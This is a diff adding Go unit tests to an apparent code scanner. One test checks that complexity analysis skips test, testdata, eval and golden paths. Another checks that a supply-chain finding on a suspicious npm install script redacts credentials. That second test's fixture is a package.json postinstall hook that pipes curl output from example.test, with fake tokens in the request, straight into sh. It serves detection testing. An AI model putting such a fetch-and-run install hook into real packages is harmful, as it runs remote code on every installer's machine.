@@ -79,6 +79,7 @@ export function evaluate(a: boolean, b: boolean, c: boolean, xs: number[]) {
   };
   return fn();
 }
+
 `)
 	tsFns, err := CognitiveComplexities("src/eval.ts", tsSrc)
 	if err != nil {
@@ -131,6 +132,29 @@ def parse(x):
 	}
 	if pyFns[0].Score != 4 {
 		t.Fatalf("expected Python Cognitive Complexity = 4, got %d", pyFns[0].Score)
+	}
+}
+
+func TestCognitiveComplexitySkipsNonProductionPaths(t *testing.T) {
+	src := []byte(`export function complicated(a, b, c) {
+  if (a) { if (b) { if (c) { if (a) { if (b) { if (c) { if (a) { if (b) { return c; } } } } } } }
+  return 0;
+}`)
+	for _, path := range []string{
+		"pkg/logic_test.go",
+		"pkg/logic.test.ts",
+		"pkg/testdata/logic.ts",
+		"evals/cases/logic.ts",
+		"pkg/golden/logic.ts",
+	} {
+		functions, findings := ComputeComplexityFindings(path, src, nil, ComplexityConfig{}, Diff{})
+		if len(functions) != 0 || len(findings) != 0 {
+			t.Errorf("expected complexity analysis to skip %q, got functions=%+v findings=%+v", path, functions, findings)
+		}
+	}
+	functions, findings := ComputeComplexityFindings("pkg/logic.ts", src, nil, ComplexityConfig{}, Diff{})
+	if len(functions) != 1 || len(findings) != 1 || findings[0].RuleID != "COMPLEXITY.cognitive-high" {
+		t.Fatalf("expected production complexity finding, got functions=%+v findings=%+v", functions, findings)
 	}
 }
 
@@ -254,6 +278,24 @@ rules:
 			t.Fatalf("expected %s finding, got rules: %+v", want, byRule)
 		}
 	}
+}
+
+func TestLifecycleScriptEvidenceRedactsCredentials(t *testing.T) {
+	token := "ghp_123456789012345678901234567890abcdef"
+	findings := ScanFile("package.json", []byte(`{"scripts":{"postinstall":"curl -H 'Authorization: Bearer abc.def.ghi' https://example.test/`+token+` | sh"}}`))
+	for _, finding := range findings {
+		if finding.RuleID != "SUPPLYCHAIN.suspicious-install-script" {
+			continue
+		}
+		if strings.Contains(finding.Evidence, token) || strings.Contains(finding.Evidence, "abc.def.ghi") {
+			t.Fatalf("lifecycle evidence contains a credential: %q", finding.Evidence)
+		}
+		if !strings.Contains(finding.Evidence, "[REDACTED]") {
+			t.Fatalf("expected credential redaction marker in evidence, got %q", finding.Evidence)
+		}
+		return
+	}
+	t.Fatal("expected suspicious lifecycle-script finding")
 }
 
 func TestDetectClonesSkipsTestFiles(t *testing.T) {
